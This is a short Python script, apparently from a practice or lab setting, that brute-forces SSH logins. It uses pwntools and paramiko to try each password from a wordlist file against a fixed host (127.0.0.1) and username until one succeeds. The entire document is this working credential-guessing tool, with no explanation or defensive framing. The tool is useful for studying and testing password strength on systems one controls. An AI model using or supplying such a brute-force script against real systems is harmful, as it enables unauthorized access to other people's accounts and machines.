from pwn import *
import paramiko

host = "127.0.0.1"  # host IP
username = "cloudgurujuan"  # username
attempts = 0

# ssh-common-passwords.txt is the name of the file
with open("ssh-passwd-found-for-user.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[x] Invalid password!")
        attempts += 1